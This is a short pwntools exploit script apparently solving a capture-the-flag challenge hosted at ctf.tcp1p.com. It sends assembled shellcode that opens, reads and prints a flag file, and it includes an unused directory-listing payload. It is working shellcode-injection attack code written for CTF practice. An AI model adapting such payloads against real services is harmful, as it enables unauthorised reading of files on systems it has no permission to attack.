from pwn import *
elf = context.binary = ELF("./chall")
r = elf.process()
r = remote("ctf.tcp1p.com",8008)
# gdb.attach(r,'''
#     b* main + 193\n
#     c
# ''')
shellcode = shellcraft.open(b"/home/ctf/flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt")
shellcode += shellcraft.read("rax", "rsp", 0x200)
shellcode += f'''
    mov rdi, 0x1
    mov rdx, 0x200
    mov rax, 0x1
    syscall
'''
sc=shellcraft.open(".",0,0x200)+shellcraft.getdents64(3,"rsp",0x200)+shellcraft.write(1,"rsp",0x200)
r.sendline(asm(shellcode))

r.interactive()